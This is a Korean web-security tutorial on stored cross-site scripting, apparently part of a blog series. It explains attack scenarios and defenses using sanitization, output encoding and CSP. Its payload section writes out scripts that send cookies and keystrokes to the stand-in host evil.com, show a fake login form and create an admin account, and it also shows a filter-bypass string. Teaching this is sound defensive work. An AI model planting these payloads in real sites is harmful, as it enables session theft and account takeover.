---
title: "Stored XSS: 저장형 크로스사이트 스크립팅의 위험성과 방어"
description: "한 번의 공격으로 모든 방문자에게 피해를 주는 저장형 XSS의 공격 원리, 실제 사례, 입력 새니타이즈와 출력 인코딩 이중 방어 전략을 다룹니다."
author: "PALDYN Team"
pubDate: "2026-06-04"
archiveOrder: 2
type: "knowledge"
category: "Security"
tags: ["XSS", "Stored XSS", "웹 보안", "OWASP", "DOMPurify", "입력 검증"]
featured: false
draft: false
---

[지난 글](/posts/websec-xss-reflected/)에서 공격자가 피해자에게 직접 링크를 보내야 하는 반사형 XSS를 살펴봤습니다. 이번 글의 주제인 **저장형 XSS(Stored XSS)**는 그보다 훨씬 위험합니다. 악성 스크립트가 서버 데이터베이스에 영구 저장되어, 해당 페이지를 방문하는 모든 사용자가 자동으로 피해를 입기 때문입니다.

## 저장형 XSS란?

공격자가 댓글, 게시글, 프로필 이름, 상품 리뷰 등 서버에 저장되는 입력란에 악성 스크립트를 삽입합니다. 서버가 이 내용을 검증 없이 DB에 저장하면, 이후 해당 페이지를 조회하는 모든 사용자의 브라우저에서 스크립트가 실행됩니다.

반사형 XSS는 피해자 한 명을 타깃으로 하는 창끝 공격이라면, 저장형 XSS는 불특정 다수를 동시에 공격하는 지뢰입니다.

![Stored XSS 공격 흐름](/assets/posts/websec-xss-stored-flow.svg)

## 대표적인 공격 시나리오

**게시판/댓글**: 가장 흔한 경우입니다. 악성 댓글을 달면 그 게시글을 읽는 모든 사용자가 피해를 입습니다.

**사용자 프로필**: 닉네임이나 자기소개란에 스크립트를 삽입하면, 해당 프로필을 조회하는 모든 사람이 감염됩니다. 관리자가 신고 처리를 위해 프로필을 열람하면 관리자 권한까지 탈취될 수 있습니다.

**채팅 메시지**: 실시간 채팅에서 스크립트가 삽입된 메시지가 다른 참여자에게 즉시 전달됩니다.

**상품 리뷰/평점**: 전자상거래 사이트에서 리뷰에 스크립트를 삽입하면 상품 페이지 방문자 전원이 피해자가 됩니다.

## 실제 페이로드와 영향

```html
<!-- 기본 세션 탈취 -->
<script>
  navigator.sendBeacon('https://evil.com/c', document.cookie);
</script>

<!-- 키로거 삽입 -->
<script>
  document.addEventListener('keypress', e => {
    fetch('https://evil.com/k?k=' + e.key);
  });
</script>

<!-- 가짜 로그인 폼 표시 (피싱) -->
<script>
  document.body.innerHTML = '<form action="https://evil.com">' +
    '<input name="user" placeholder="Username">' +
    '<input type="password" name="pass" placeholder="Password">' +
    '<button>Login</button></form>';
</script>

<!-- 관리자 계정 생성 (CSRF + XSS 조합) -->
<script>
  fetch('/admin/users', {
    method: 'POST',
    body: JSON.stringify({role: 'admin', user: 'attacker'}),
    headers: {'Content-Type': 'application/json'},
    credentials: 'include'
  });
</script>
```

## 취약한 코드 패턴

```python
# Django (취약) - mark_safe 남용
from django.utils.safestring import mark_safe

def comment_view(request, post_id):
    comments = Comment.objects.filter(post_id=post_id)
    # ❌ mark_safe는 인코딩을 우회함
    content = mark_safe(comments[0].body)
    return render(request, 'post.html', {'content': content})
```

```javascript
// React (취약) - dangerouslySetInnerHTML 남용
function Comment({ body }) {
  // ❌ 사용자 입력을 직접 삽입
  return <div dangerouslySetInnerHTML={{ __html: body }} />;
}

// React (안전) - 그냥 텍스트로 렌더링
function Comment({ body }) {
  // ✅ React가 자동으로 이스케이프
  return <div>{body}</div>;
}
```

## 방어 전략: 저장 시와 출력 시 이중 처리

![Stored XSS 방어 기법](/assets/posts/websec-xss-stored-sanitize.svg)

저장형 XSS는 **입력 저장 시 새니타이즈**와 **출력 시 인코딩**, 두 단계 모두에서 방어해야 합니다.

**1단계 — 입력 새니타이즈**: 허용된 HTML 태그만 남기고 나머지는 제거합니다.

```python
# Python bleach (서버 사이드)
import bleach

ALLOWED_TAGS = ['b', 'i', 'u', 'em', 'strong', 'p', 'br', 'ul', 'li']
ALLOWED_ATTRS = {}  # 속성은 최소화

def save_comment(body):
    clean_body = bleach.clean(body, tags=ALLOWED_TAGS,
                              attributes=ALLOWED_ATTRS, strip=True)
    Comment.objects.create(body=clean_body)
```

```javascript
// Node.js DOMPurify (서버 사이드, jsdom 필요)
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

function saveComment(body) {
  const clean = DOMPurify.sanitize(body, {
    ALLOWED_TAGS: ['b', 'i', 'p', 'br'],
    ALLOWED_ATTR: []
  });
  db.run('INSERT INTO comments (body) VALUES (?)', [clean]);
}
```

**2단계 — 출력 인코딩**: 리치 텍스트가 필요 없는 경우 텍스트로만 출력합니다.

```python
# Django 템플릿 (자동 이스케이프 — 기본 활성화)
# {{ comment.body }}  ← 자동 이스케이프됨

# 리치 텍스트가 필요한 경우 mark_safe는 새니타이즈 후에만
from django.utils.safestring import mark_safe
safe_body = mark_safe(bleach.clean(comment.body, tags=ALLOWED_TAGS))
```

**3단계 — CSP 헤더**: 저장형 XSS에서 CSP는 마지막 방어선입니다.

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{서버생성-랜덤값}';
  object-src 'none'
```

## 정규식으로 필터링하면 안 되는 이유

직접 작성한 블랙리스트 필터는 우회되기 쉽습니다:

```javascript
// 취약한 필터 예시 — 우회 가능
function badFilter(input) {
  return input.replace(/<script>/gi, '').replace(/<\/script>/gi, '');
}

// 우회 페이로드
badFilter('<scr<script>ipt>alert(1)</scr</script>ipt>');
// 결과: <script>alert(1)</script> — 필터 우회!
```

항상 검증된 라이브러리(DOMPurify, bleach, OWASP Java HTML Sanitizer)를 사용해야 합니다.

---

**지난 글:** [Reflected XSS: 반사형 크로스사이트 스크립팅 완전 분석](/posts/websec-xss-reflected/)

**다음 글:** [DOM 기반 XSS: 서버를 거치지 않는 클라이언트 사이드 공격](/posts/websec-xss-dom-based/)

<br>
읽어주셔서 감사합니다. 😊
